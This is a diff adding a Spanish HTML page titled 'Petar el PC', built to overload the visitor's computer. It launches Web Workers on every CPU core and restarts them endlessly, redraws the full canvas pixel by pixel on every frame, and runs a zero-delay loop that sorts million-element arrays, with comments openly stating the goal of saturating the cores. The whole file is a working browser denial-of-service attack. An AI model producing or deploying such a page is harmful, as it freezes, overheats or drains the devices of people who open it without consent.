@@ -1,0 +1,104 @@
+```html
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Petar el PC</title>
+  <style>
+    html,body{margin:0;height:100%;overflow:hidden;background:#000;color:#0f0;font-family:monospace;}
+    canvas{position:absolute;top:0;left:0;width:100%;height:100%;}
+    #log{position:absolute;bottom:0;left:0;right:0;height:120px;background:#000a;padding:8px;overflow-y:scroll;font-size:12px;}
+  </style>
+</head>
+<body>
+  <canvas id="c"></canvas>
+  <div id="log"></div>
+  <script>
+    const canvas=document.getElementById('c');
+    const ctx=canvas.getContext('2d');
+    function resize(){canvas.width=innerWidth;canvas.height=innerHeight;}
+    resize();window.addEventListener('resize',resize);
+    const logEl=document.getElementById('log');
+    function log(m){logEl.innerHTML+=m+'<br>';logEl.scrollTop=logEl.scrollHeight;}
+    log('Iniciando cálculo demoledor...');
+
+    // Número grande de términos (≈16 millones)
+    const N=1<<24;
+    const block=1<<16;
+    let idx=0;
+    let sum=0;
+
+    // Worker en línea para saturar cores
+    const workerCode=`
+      self.onmessage=function(e){
+        const {start,end}=e.data;
+        let s=0;
+        for(let i=start;i<end;i++){
+          const x=i/(1<<24)*20-10;
+          s+=Math.sin(x*x)*Math.cos(x*Math.PI)*Math.exp(-x*x/100);
+        }
+        self.postMessage(s);
+      };
+    `;
+    const blob=new Blob([workerCode],{type:'application/javascript'});
+    const workerUrl=URL.createObjectURL(blob);
+    const cores=navigator.hardwareConcurrency||8;
+    let done=0;
+
+    function launch(){
+      const perBlock=N/cores;
+      for(let w=0;w<cores;w++){
+        const wk=new Worker(workerUrl);
+        const start=Math.floor(w*perBlock);
+        const end=Math.floor((w+1)*perBlock);
+        wk.postMessage({start,end});
+        wk.onmessage=function(m){
+          sum+=m.data;
+          done++;
+          if(done===cores){
+            log('Sumatoria infinitesimal: '+sum);
+            // Volvemos a lanzar sin parar
+            done=0;
+            sum=0;
+            setTimeout(launch,0);
+          }
+        };
+      }
+    }
+    launch();
+
+    // Dibujar ondas pesadas mientras tanto
+    let t=0;
+    function draw(){
+      ctx.fillStyle='rgba(0,0,0,0.05)';
+      ctx.fillRect(0,0,canvas.width,canvas.height);
+      const img=ctx.getImageData(0,0,canvas.width,canvas.height);
+      const data=img.data;
+      for(let y=0;y<canvas.height;y++){
+        for(let x=0;x<canvas.width;x++){
+          const i=(y*canvas.width+x)*4;
+          const v=Math.sin((x*y+t)*0.0001)*Math.cos((x-y)*0.01+t)*255;
+          data[i+0]=v;
+          data[i+1]=v*0.8;
+          data[i+2]=v*0.6;
+          data[i+3]=255;
+        }
+      }
+      ctx.putImageData(img,0,0);
+      t++;
+      requestAnimationFrame(draw);
+    }
+    draw();
+
+    // Fuerza bruta adicional
+    setInterval(()=>{
+      const m=[];
+      for(let i=0;i<1e6;i++){
+        m.push(Math.random());
+      }
+      m.sort((a,b)=>a-b);
+    },0);
+  </script>
+</body>
+</html>
+```
